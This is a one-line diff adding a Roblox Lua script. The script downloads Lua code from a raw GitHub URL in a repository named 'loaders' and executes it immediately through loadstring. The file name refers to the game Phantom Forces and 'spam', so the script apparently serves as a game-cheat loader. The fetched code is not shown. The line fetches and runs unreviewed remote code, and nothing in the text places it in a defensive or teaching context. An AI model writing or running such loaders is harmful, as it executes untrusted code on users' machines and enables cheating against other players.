@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/fall-weapon-remodels-phantom-forces-spam2-z7bklnpbf8713u.lua"))()
